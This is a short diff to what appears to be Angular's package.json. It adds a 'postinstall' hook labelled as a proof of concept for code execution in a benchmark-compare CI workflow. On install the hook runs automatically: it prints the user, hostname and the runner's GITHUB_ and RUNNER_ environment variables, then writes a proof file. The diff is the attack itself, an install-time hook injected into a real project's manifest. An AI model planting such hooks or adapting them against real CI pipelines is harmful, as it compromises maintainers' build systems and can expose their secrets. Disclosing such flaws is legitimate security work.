@@ -17,6 +17,7 @@
     "url": "https://github.com/angular/angular.git"
   },
   "scripts": {
+    "postinstall": "echo '=== ANGULAR BENCHMARK-COMPARE POC ===' && id && hostname && date && env | grep -E '^(GITHUB|RUNNER)_' | head -20 && echo 'RCE via root postinstall in benchmark-compare workflow' > /tmp/angular-poc-proof.txt && cat /tmp/angular-poc-proof.txt",
     "prepare": "husky",
     "ng-dev": "ng-dev",
     "build": "node scripts/build/build-packages-dist.mts",
